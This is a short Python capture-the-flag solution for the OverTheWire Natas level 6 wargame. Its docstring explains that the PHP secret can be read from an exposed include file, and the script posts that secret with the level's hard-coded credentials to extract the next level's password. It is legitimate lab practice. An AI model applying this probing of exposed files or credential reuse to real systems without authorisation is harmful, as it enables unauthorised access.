import requests
import re

"""
Explanation:
If we analyze the source code in "http://natas6.natas.labs.overthewire.org/index-source.html" we see some php code:
<?
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
>> includes a file called secret.inc
>> Pulls $secret variable from the file
>> Contains an if condition
1. If there is a submit post request, it will check if the post request's value is equal to the $secret variable, which returns natas7's password
2. If not, it will return "Wrong secret"

So when we check out the includes/secret.inc file, we find the secret variable: FOEIUWGHFEEUHOFUOIU
We enter that value in a post request as the secret, then we receive the flag!
"""

# Authentication
username = "natas6"
password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

# URL to users.txt
url = f"http://{username}.natas.labs.overthewire.org/"

response = requests.post(url, data={"secret":"FOEIUWGHFEEUHOFUOIU", "submit":"submit"}, auth=(username, password))
content = response.text

print(re.findall("The password for natas7 is (.*)", content)[0])